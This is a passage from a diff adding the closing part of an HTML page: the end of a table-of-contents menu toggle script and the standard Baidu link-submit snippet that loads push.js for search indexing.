+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
